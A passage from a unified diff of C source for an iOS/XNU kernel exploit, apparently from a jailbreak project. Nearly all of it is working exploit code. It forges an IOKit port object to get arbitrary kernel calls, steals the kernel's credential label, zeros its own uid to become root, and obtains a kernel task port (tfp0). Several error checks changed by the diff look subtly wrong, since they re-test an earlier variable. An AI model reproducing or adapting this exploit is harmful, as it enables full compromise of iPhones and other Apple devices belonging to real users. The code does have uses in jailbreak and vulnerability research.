-            kptr_t trap_ptr;
             // IOExternalTrap fields
             kptr_t obj;
             kptr_t func;
             uint32_t break_stuff; // idk wtf this field does, but it has to be zero or iokit_user_client_trap does some weird pointer mashing
-            // OSSerializer::serialize
-            kptr_t indirect[3];
         } a;
         struct {
             char pad[OFFSET_IOUSERCLIENT_IPC];
             int32_t __ipc;
         } b;
-    } kobj_t;
+    } object;
+    memset(&object, 0, sizeof(object));
+    object.a.vtab = (kptr_t)&vtab;
+    object.a.refs = 100;
+    object.b.__ipc = 100;
     
-    uint32_t fakeobj_off = 0;
-    FIND_RANGE(fakeobj_off, sizeof(kobj_t));
-    kptr_t fakeobj_addr = fake_addr + fakeobj_off;
-    LOG("fakeobj addr: " ADDR, fakeobj_addr);
-    volatile kobj_t *fakeobj_buf = (volatile kobj_t*)(shmem_addr + fakeobj_off);
-    VOLATILE_ZERO(fakeobj_buf, sizeof(kobj_t));
+    kport.ip_bits = 0x8000001d; // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
+    kport.ip_kobject = (kptr_t)&object;
     
-    fakeobj_buf->a.vtab = vtab_addr;
-    fakeobj_buf->a.refs = 100;
-    fakeobj_buf->a.trap_ptr = fakeobj_addr + ((uintptr_t)&fakeobj_buf->a.obj - (uintptr_t)fakeobj_buf);
-    fakeobj_buf->a.break_stuff = 0;
-    fakeobj_buf->b.__ipc = 100;
+    for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
+    {
+        *(volatile kport_t*)ptr = kport;
+    }
+    size = sizeof(dummy);
+#undef KREAD
     
-    fakeport_buf->ip_bits = 0x8000001d; // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
-    fakeport_buf->ip_kobject = fakeobj_addr;
+    // we leak a ref on realport here
+    sched_yield();
+    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
+    if(ret != KERN_SUCCESS)
+    {
+        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
+        goto out3;
+    }
+    size = sizeof(dummy);
+    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
+    LOG("setValue(%u): %s", idx, mach_error_string(ret));
+    if(ret != KERN_SUCCESS)
+    {
+        goto out3;
+    }
     
-    // First arg to KCALL can't be == 0, so we need KCALL_ZERO which indirects through OSSerializer::serialize.
-    // That way it can take way less arguments, but well, it can pass zero as first arg.
 #define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
 ( \
-fakeobj_buf->a.obj = (kptr_t)(x0), \
-fakeobj_buf->a.func = (kptr_t)(addr), \
+object.a.obj = (kptr_t)(x0), \
+object.a.func = (kptr_t)(addr), \
 (kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x1), (kptr_t)(x2), (kptr_t)(x3), (kptr_t)(x4), (kptr_t)(x5), (kptr_t)(x6)) \
-)
-#define KCALL_ZERO(addr, x0, x1, x2) \
-( \
-fakeobj_buf->a.obj = fakeobj_addr + ((uintptr_t)&fakeobj_buf->a.indirect - (uintptr_t)fakeobj_buf) - 2 * sizeof(kptr_t), \
-fakeobj_buf->a.func = OFF(OSSERIALIZER_SERIALIZE), \
-fakeobj_buf->a.indirect[0] = (x0), \
-fakeobj_buf->a.indirect[1] = (x1), \
-fakeobj_buf->a.indirect[2] = (addr), \
-(kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x2), 0, 0, 0, 0, 0) \
 )
     kptr_t kernel_task_addr = 0;
     int r = KCALL(OFF(COPYOUT), OFF(KERNEL_TASK), &kernel_task_addr, sizeof(kernel_task_addr), 0, 0, 0, 0);
-    LOG("kernel_task addr: " ADDR ", %s, %s", kernel_task_addr, errstr(r), mach_error_string(r));
+    LOG("kernel_task addr: " ADDR ", %s", kernel_task_addr, errstr(r));
     if(r != 0 || !kernel_task_addr)
     {
-        goto out;
+        goto out4;
     }
     
     kptr_t kernproc_addr = 0;
     r = KCALL(OFF(COPYOUT), kernel_task_addr + OFFSET_TASK_BSD_INFO, &kernproc_addr, sizeof(kernproc_addr), 0, 0, 0, 0);
-    LOG("kernproc addr: " ADDR ", %s, %s", kernproc_addr, errstr(r), mach_error_string(r));
+    LOG("kernproc addr: " ADDR ", %s", kernproc_addr, errstr(r));
     if(r != 0 || !kernproc_addr)
     {
-        goto out;
+        goto out4;
     }
     
     kptr_t kern_ucred = 0;
     r = KCALL(OFF(COPYOUT), kernproc_addr + OFFSET_PROC_UCRED, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
-    LOG("kern_ucred: " ADDR ", %s, %s", kern_ucred, errstr(r), mach_error_string(r));
-    if(r != 0 || !kern_ucred)
+    LOG("kern_ucred: " ADDR ", %s", kern_ucred, errstr(r));
+    if(r != 0 || !kernproc_addr)
     {
-        goto out;
+        goto out4;
     }
     
     kptr_t self_proc = 0;
     r = KCALL(OFF(COPYOUT), self_task + OFFSET_TASK_BSD_INFO, &self_proc, sizeof(self_proc), 0, 0, 0, 0);
-    LOG("self_proc: " ADDR ", %s, %s", self_proc, errstr(r), mach_error_string(r));
-    if(r != 0 || !self_proc)
+    LOG("self_proc: " ADDR ", %s", self_proc, errstr(r));
+    if(r != 0 || !kernproc_addr)
     {
-        goto out;
+        goto out4;
     }
     
     kptr_t self_ucred = 0;
     r = KCALL(OFF(COPYOUT), self_proc + OFFSET_PROC_UCRED, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
-    LOG("self_ucred: " ADDR ", %s, %s", self_ucred, errstr(r), mach_error_string(r));
-    if(r != 0 || !self_ucred)
+    LOG("self_ucred: " ADDR ", %s", self_ucred, errstr(r));
+    if(r != 0 || !kernproc_addr)
     {
-        goto out;
+        goto out4;
     }
     
-    int olduid = getuid();
-    LOG("uid: %u", olduid);
+    KCALL(OFF(BCOPY), kern_ucred + OFFSET_UCRED_CR_LABEL, self_ucred + OFFSET_UCRED_CR_LABEL, sizeof(kptr_t), 0, 0, 0, 0);
+    LOG("stole the kernel's cr_label");
     
-    KCALL(OFF(KAUTH_CRED_REF), kern_ucred, 0, 0, 0, 0, 0, 0);
-    r = KCALL(OFF(COPYIN), &kern_ucred, self_proc + OFFSET_PROC_UCRED, sizeof(kern_ucred), 0, 0, 0, 0);
-    LOG("copyin: %s", errstr(r));
-    if(r != 0 || !self_ucred)
-    {
-        goto out;
-    }
-    // Note: decreasing the refcount on the old cred causes a panic with "cred reference underflow", so... don't do that.
-    LOG("stole the kernel's credentials");
+    KCALL(OFF(BZERO), self_ucred + OFFSET_UCRED_CR_UID, 12, 0, 0, 0, 0, 0);
     setuid(0); // update host port
-    
-    int newuid = getuid();
-    LOG("uid: %u", newuid);
-    
-    if(newuid != olduid)
-    {
-        KCALL_ZERO(OFF(CHGPROCCNT), newuid, 1, 0);
-        KCALL_ZERO(OFF(CHGPROCCNT), olduid, -1, 0);
-    }
+    LOG("uid: %u", getuid());
     
     host_t realhost = mach_host_self();
     LOG("realhost: %x (host: %x)", realhost, host);
     
-    uint32_t zm_task_off = 0;
-    FIND_RANGE(zm_task_off, sizeof(ktask_t));
-    kptr_t zm_task_addr = fake_addr + zm_task_off;
-    LOG("zm_task addr: " ADDR, zm_task_addr);
-    volatile ktask_t *zm_task_buf = (volatile ktask_t*)(shmem_addr + zm_task_off);
-    VOLATILE_ZERO(zm_task_buf, sizeof(ktask_t));
-    
-    zm_task_buf->a.lock.data = 0x0;
-    zm_task_buf->a.lock.type = 0x22;
-    zm_task_buf->a.ref_count = 100;
-    zm_task_buf->a.active = 1;
-    zm_task_buf->b.itk_self = 1;
-    zm_task_buf->a.map = zone_map_addr;
-    
-    uint32_t km_task_off = 0;
-    FIND_RANGE(km_task_off, sizeof(ktask_t));
-    kptr_t km_task_addr = fake_addr + km_task_off;
-    LOG("km_task addr: " ADDR, km_task_addr);
-    volatile ktask_t *km_task_buf = (volatile ktask_t*)(shmem_addr + km_task_off);
-    VOLATILE_ZERO(km_task_buf, sizeof(ktask_t));
-    
-    km_task_buf->a.lock.data = 0x0;
-    km_task_buf->a.lock.type = 0x22;
-    km_task_buf->a.ref_count = 100;
-    km_task_buf->a.active = 1;
-    km_task_buf->b.itk_self = 1;
-    r = KCALL(OFF(COPYOUT), OFF(KERNEL_MAP), &km_task_buf->a.map, sizeof(km_task_buf->a.map), 0, 0, 0, 0);
-    LOG("kernel_map: " ADDR ", %s", km_task_buf->a.map, errstr(r));
-    if(r != 0 || !km_task_buf->a.map)
+    ktask_t zm_task;
+    zm_task.a.lock.data = 0x0;
+    zm_task.a.lock.type = 0x22;
+    zm_task.a.ref_count = 100;
+    zm_task.a.active = 1;
+    zm_task.b.itk_self = 1;
+    r = KCALL(OFF(COPYOUT), OFF(ZONE_MAP), &zm_task.a.map, sizeof(zm_task.a.map), 0, 0, 0, 0);
+    LOG("zone_map: " ADDR ", %s", zm_task.a.map, errstr(r));
+    if(r != 0 || !zm_task.a.map)
     {
-        goto out;
+        goto out4;
+    }
+    
+    ktask_t km_task;
+    km_task.a.lock.data = 0x0;
+    km_task.a.lock.type = 0x22;
+    km_task.a.ref_count = 100;
+    km_task.a.active = 1;
+    km_task.b.itk_self = 1;
+    r = KCALL(OFF(COPYOUT), OFF(KERNEL_MAP), &km_task.a.map, sizeof(km_task.a.map), 0, 0, 0, 0);
+    LOG("kernel_map: " ADDR ", %s", km_task.a.map, errstr(r));
+    if(r != 0 || !km_task.a.map)
+    {
+        goto out4;
     }
     
     kptr_t ipc_space_kernel = 0;
@@ -1322,23 +2384,23 @@ fakeobj_buf->a.indirect[2] = (addr), \
     LOG("ipc_space_kernel: " ADDR ", %s", ipc_space_kernel, errstr(r));
     if(r != 0 || !ipc_space_kernel)
     {
-        goto out;
+        goto out4;
     }
     
 #ifdef __LP64__
     kmap_hdr_t zm_hdr = { 0 };
-    r = KCALL(OFF(COPYOUT), zm_task_buf->a.map + OFFSET_VM_MAP_HDR, &zm_hdr, sizeof(zm_hdr), 0, 0, 0, 0);
+    r = KCALL(OFF(COPYOUT), zm_task.a.map + OFFSET_VM_MAP_HDR, &zm_hdr, sizeof(zm_hdr), 0, 0, 0, 0);
     LOG("zm_range: " ADDR "-" ADDR ", %s", zm_hdr.start, zm_hdr.end, errstr(r));
     if(r != 0 || !zm_hdr.start || !zm_hdr.end)
     {
-        goto out;
+        goto out4;
     }
     if(zm_hdr.end - zm_hdr.start > 0x100000000)
     {
         LOG("zone_map is too big, sorry.");
-        goto out;
+        goto out4;
     }
-    kptr_t zm_tmp = 0; // macro scratch space
+    kptr_t zm_tmp; // macro scratch space
 #   define ZM_FIX_ADDR(addr) \
 ( \
 zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
@@ -1354,43 +2416,45 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     LOG("zm_port addr: " ADDR, ptrs[0]);
     LOG("km_port addr: " ADDR, ptrs[1]);
     
-    KCALL(OFF(IPC_KOBJECT_SET), ptrs[0], zm_task_addr, IKOT_TASK, 0, 0, 0, 0);
-    KCALL(OFF(IPC_KOBJECT_SET), ptrs[1], km_task_addr, IKOT_TASK, 0, 0, 0, 0);
+    KCALL(OFF(IPC_KOBJECT_SET), ptrs[0], (kptr_t)&zm_task, IKOT_TASK, 0, 0, 0, 0);
+    KCALL(OFF(IPC_KOBJECT_SET), ptrs[1], (kptr_t)&km_task, IKOT_TASK, 0, 0, 0, 0);
     
     r = KCALL(OFF(COPYIN), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
     LOG("copyin: %s", errstr(r));
     if(r != 0)
     {
-        goto out;
+        goto out4;
     }
+    mach_port_array_t maps = NULL;
     mach_msg_type_number_t mapsNum = 0;
     ret = mach_ports_lookup(self, &maps, &mapsNum);
     LOG("mach_ports_lookup: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out4;
     }
     LOG("zone_map port: %x", maps[0]);
     LOG("kernel_map port: %x", maps[1]);
     if(!MACH_PORT_VALID(maps[0]) || !MACH_PORT_VALID(maps[1]))
     {
-        goto out;
+        goto out4;
     }
-    // Clean out the pointers without dropping refs
-    ptrs[0] = ptrs[1] = 0;
-    r = KCALL(OFF(COPYIN), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
-    LOG("copyin: %s", errstr(r));
-    if(r != 0)
+    // Clean out refs right away
+    ret = mach_ports_register(self, NULL, 0);
+    LOG("mach_ports_register: %s", mach_error_string(ret));
+    if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out5;
     }
     
     mach_vm_address_t remap_addr = 0;
+    vm_prot_t cur = 0,
+    max = 0;
     ret = mach_vm_remap(maps[1], &remap_addr, SIZEOF_TASK, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kernel_task_addr, false, &cur, &max, VM_INHERIT_NONE);
     LOG("mach_vm_remap: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out5;
     }
     LOG("remap_addr: 0x%016llx", remap_addr);
     
@@ -1398,7 +2462,7 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     LOG("mach_vm_wire: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out5;
     }
     
     kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
@@ -1409,7 +2473,7 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     LOG("copyin: %s", errstr(r));
     if(r != 0)
     {
-        goto out;
+        goto out4;
     }
     
     task_t kernel_task = MACH_PORT_NULL;
@@ -1417,54 +2481,52 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     LOG("kernel_task: %x, %s", kernel_task, mach_error_string(ret));
     if(ret != KERN_SUCCESS || !MACH_PORT_VALID(kernel_task))
     {
-        goto out;
+        goto out5;
     }
     
-    if(callback)
-    {
-        ret = callback(kernel_task, kbase, cb_data);
-        if(ret != KERN_SUCCESS)
-        {
-            LOG("callback returned error: %s", mach_error_string(ret));
-            goto out;
-        }
-    }
-    
+    *tfp0 = kernel_task;
+    *kslide = slide;
     retval = KERN_SUCCESS;
     
-    out:;
-    LOG("Cleaning up...");
-    usleep(100000); // Allow logs to propagate
-    if(maps)
-    {
-        RELEASE_PORT(maps[0]);
-        RELEASE_PORT(maps[1]);
-    }
-    RELEASE_PORT(fakeport);
+out5:;
+    _kernelrpc_mach_port_destroy_trap(self, maps[0]);
+    _kernelrpc_mach_port_destroy_trap(self, maps[1]);
+out4:;
+    ret = mach_ports_register(self, &fakeport, 1);
+    LOG("mach_ports_register: %s", mach_error_string(ret));
+    r = KCALL(OFF(COPYIN), &realport_addr, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(realport_addr), 0, 0, 0, 0); // Fix the ref we leaked earlier
+    LOG("copyin: %s", errstr(r));
+    _kernelrpc_mach_port_destroy_trap(self, fakeport);
+out3:;
     for(size_t i = 0; i < NUM_AFTER; ++i)
     {
-        RELEASE_PORT(after[i]);
+        if(MACH_PORT_VALID(after[i]))
+        {
+            _kernelrpc_mach_port_destroy_trap(self, after[i]);
+            after[i] = MACH_PORT_NULL;
+        }
     }
-    RELEASE_PORT(port);
+    if(MACH_PORT_VALID(port))
+    {
+        _kernelrpc_mach_port_destroy_trap(self, port);
+        port = MACH_PORT_NULL;
+    }
+out2:;
     for(size_t i = 0; i < NUM_BEFORE; ++i)
     {
-        RELEASE_PORT(before[i]);
+        if(MACH_PORT_VALID(before[i]))
+        {
+            _kernelrpc_mach_port_destroy_trap(self, before[i]);
+            before[i] = MACH_PORT_NULL;
+        }
     }
-    RELEASE_PORT(realport);
-    RELEASE_PORT(stuffport);
-    RELEASE_PORT(client);
-    my_mach_zone_force_gc(host);
-    if(shmem_addr != 0)
+    if(MACH_PORT_VALID(realport))
     {
-        _kernelrpc_mach_vm_deallocate_trap(self, shmem_addr, DATA_SIZE);
-        shmem_addr = 0;
+        _kernelrpc_mach_port_destroy_trap(self, realport);
+        realport = MACH_PORT_NULL;
     }
-    
-    // Pass through error code, if existent
-    if(retval != KERN_SUCCESS && ret != KERN_SUCCESS)
-    {
-        retval = ret;
-    }
+out1:;
+    IOServiceClose(client);
+out0:;
     return retval;
 }
-
